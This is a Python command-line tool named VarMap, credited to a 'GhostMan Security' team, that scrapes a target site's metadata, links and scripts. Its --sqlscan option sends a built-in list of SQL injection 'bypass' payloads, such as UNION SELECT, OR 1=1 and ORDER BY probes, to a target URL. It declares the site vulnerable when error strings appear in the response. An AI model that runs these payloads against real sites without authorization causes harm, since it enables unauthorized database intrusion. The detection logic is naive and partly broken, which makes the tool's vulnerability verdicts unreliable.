import argparse
import requests
import socket
import time
import hashlib
import random
import datetime
import os
from bs4 import BeautifulSoup

def __banner__():
	date_time = datetime.datetime.now()
	time_now = date_time.strftime("[+] Starting %H:%M:%S /%Y:%m:%d")
	print('''
               ___
 _____          H    3;) 100101001 
|  |  |___ ___ [,] _____ ___ ___  {1.2}
|  |  | .'|  _|[)]|     | .'| . | {Pham Chien}
 \___/|__,|_|  [(]|_|_|_|__,|  _|
                V           |_|   ghostmanews.blogspot.com 
        Copyright : Pham Chien
        Team : GhostMan Security
''')
	print(time_now)
	print("")
def __session__():
	argparsers = argparse.ArgumentParser(description="[!] VarMap Tool - Exploring Website Information VarMap V1.2")
	argparsers.add_argument('--url', type=str, help='URL target (ex : https://test.com)')
	argparsers.add_argument('--check', action='store_true', help='Checking target URL')
	argparsers.add_argument('--version', action='store_true', help='Checking Version Target URL')
	argparsers.add_argument('--propertie', action='store_true', help='Scanning ALL Propertie URL Target')
	argparsers.add_argument('--infomation', action='store_true', help='Scanning ALL Infomation URL Target')
	argparsers.add_argument('--filter', action='store_true', help='Scanning ALL Filter URL Target')
	argparsers.add_argument('--meta', action='store_true', help='Checking Items META URL target')
	argparsers.add_argument('--link', action='store_true', help='Checking Items LINKS URL target')
	argparsers.add_argument('--script', action='store_true', help='Checking Items script URL target')
	argparsers.add_argument('--sqlscan', action='store_true', help='Payload Scan Vulnerable SQL injection')
	argparsers.add_argument('--about', action='store_true', help='Show This About')

	args = argparsers.parse_args()

	URL = args.url
	CHECK = args.check
	VER = args.version

	if URL:
		if CHECK:
			start_time = datetime.datetime.now()
			now_time = start_time.strftime("%H:%M:%S")
			print("[{}] [info] starting check response from {}".format(now_time, URL))
			response = requests.get(URL)
			if response.status_code == 200:
				print(f"[{now_time}] [info] the target URL as responsed , status code : 200")
				time.sleep(0.90)
				print(f"[{now_time}] [info] starting checking...")
				time.sleep(1)
				def __check__():
					your_domain = URL.replace("http://", "").replace("https://", "")
					remove_http = your_domain.split("://")
					URL_new = remove_http[-1]
					remove = URL_new.replace("/", "")
					results = remove.split("/")
					remove_now = "/".join(results[-1])
					def __getid__():
						id_code = hashlib.md5(URL.encode()).hexdigest()
						versions = response.raw.version
						md5_url = hashlib.md5(URL_new.encode()).hexdigest()
						print("+--------------------------------+")
						print("INFOMATION BASIC : ")
						print(f"Info Show : {now_time}")
						print("Target : {}".format(URL))
						print("Version : {}".format(versions))
						print("Path : {}".format(remove_now))
						print("ID : {}".format(id_code))
						print("MD5 : {}".format(md5_url))
						print("+--------------------------------+")
						print("OUTPUT RECV : ")
						time.sleep(0.50)
					__getid__()
				__check__()

				if VER:
					code = response.raw.version
					print(f"[{now_time}] Version HTTP : ", code)

				if args.propertie:
					properties = dir(response)
					for line in properties:
						print("[{}] properties : {}".format(now_time, line))
						time.sleep(0.10)
				if args.infomation:
					soup = BeautifulSoup(response.text, 'html.parser')
					script = soup.find_all('script')
					link = soup.find_all('link')
					for lines in script:
						print("[{}] [info] script java : {}".format(now_time, lines))
						time.sleep(0.10)
					for lines in link:
						print("[{}] [info] link : {}".format(now_time, lines))
						time.sleep(0.10)

				if args.filter:
					def __getfilter__():
						script = BeautifulSoup(response.text, 'html.parser')
						var_script = script.find_all('script')
						filter_properties = vars(response)
						print(var_script)
						for data, line in filter_properties.items():
							if data != "_content":
								if data:
									print("[{}] [info] filter : {} : {}".format(now_time, data, line))
									time.sleep(0.50)
								else:
									print(f"[{now_time}] [info] No Filter..")
					__getfilter__()
				if args.meta:
					def __getmeta__():
						meta_script = BeautifulSoup(response.text, 'html.parser')
						scanning = meta_script.find_all('meta')
						for line_meta in scanning:
							print("[{}] [info] Meta Line : {}".format(now_time, line_meta))
							time.sleep(0.10)
					__getmeta__()

				if args.link:
					def __getlink__():
						get_link = BeautifulSoup(response.text, 'html.parser')
						link = get_link.find_all('link')
						for line in link:
							print("[{}] [info] Link Line : {}".format(now_time, line))
							time.sleep(0.10)
					__getlink__()

				if args.script:
					def __script__():
						get_script = BeautifulSoup(response.text, 'html.parser')
						scriptsheet = get_script.find_all('script')
						for line in scriptsheet:
							print("[info] script : {}".format(line))
							time.sleep(0.10)
					__script__()

				if args.sqlscan:
					def _startpayload_():
						session = True 
						if args.sqlscan:
							def __sql__():
								# payload bypass SQLi
								payloads = [
									"%27*/",
									"/*/*/%27",
									"/*/*/ORDER BY 1--",
									"/*/*/ORDER BY 2--",
									"/*/*/ORDER BY 3--",
									"/*/*/ORDER BY 4--",
									"/*/*/OR 1=1--",
									"/*/*/Union Select 1,2,3--",
									"/*/*/Union Select 1,2,3,4,5,6--",
									"/*/*/Union Select 1,2,3,4,5,6,7,8,9,10--",
								]
								for payload_bypass in payloads:
									response_output = requests.get(URL + payload_bypass)
									if response_output.status_code == 200:
										if "SQL" in response_output.text:
											print("[{}] [info] {}{}".format(now_time, URL, payload_bypass))
											print("status : Bypass Success")
											print("status : Vulnerable SQL")
											version = response.raw.version
											print("Version : {}".format(version))
											line = vars(response)
											if line != "_content":
												print("Line : ", line)
												print("")
												error = "SQL"
												print("Error : {}".format(error))
											exit()
										elif "MySQL" in response_output.text:
											print("[{}] [info] {}{}".format(now_time, URL, payload_bypass))
											print("status : Bypass Success")
											print("status : Vulnerable SQL")
											version = response.raw.version
											print("Version : {}".format(version))
											line = vars(response)
											if line != "_content":
												print("Line : ", line)
												print("")
												error = "SQL"
												print("Error : {}".format(error))
											exit()
										elif "mysql" in response_output.text:
											print("[{}] [info] {}{}".format(now_time, URL, payload_bypass))
											print("status : Bypass Success")
											print("status : Vulnerable SQL")
											version = response.raw.version
											print("Version : {}".format(version))
											line = vars(response)
											if line != "_content":
												print("Line : ", line)
												print("")
												error = "SQL"
												print("Error : {}".format(error))
											exit()
										elif "at line" in response_output.text:
											print("[{}] [info] {}{}".format(now_time, URL, payload_bypass))
											print("status : Bypass Success")
											print("status : Vulnerable SQL")
											version = response.raw.version
											print("Version : {}".format(version))
											line = vars(response)
											if line != "_content":
												print("Line : ", line)
												print("")
												error = "SQL"
												print("[{}] Error : {}".format(now_time, error))
											exit()
										else:
											print("")
											print("[{}] [info] {}{}".format(now_time, URL, payload_bypass))
											print("status : Bypass Failed !!! ")

									elif response_output.status_code == 403:
										print("")
										print(f"[{now_time}] [info] SERVER BLOCKED")
										exit()
									else:
										print("")
										print(f"[{now_time}] [info] URL BLOCKED !!")
										exit()
							__sql__()
					_startpayload_()
					
			else:
				print("[warning] the target not response, please agian")
				exit()
		else:
			print("[info] you not set payload checking")
	else:
		print("Usage : python varmap.py --url <http://test.com> --check --version")
		print("Typer Command : python varmap.py -h for help")
		print('''
[!] VarMap Tool - Exploring Website Information

[+] Technology is constantly evolving, and websites have become an integral part of modern life. However, with the increasing popularity of websites, managing information on them has also become more complex. That's where the VarMap tool comes in, providing an effective solution for scanning and discovering information from a website.''')
		exit()

	if args.about:
		print('''
[!] VarMap Tool - Exploring Website Information

[+] Technology is constantly evolving, and websites have become an integral part of modern life. However, with the increasing popularity of websites, managing information on them has also become more complex. That's where the VarMap tool comes in, providing an effective solution for scanning and discovering information from a website.
''')
		exit()

if __name__ == '__main__':
	__banner__()
	__session__()
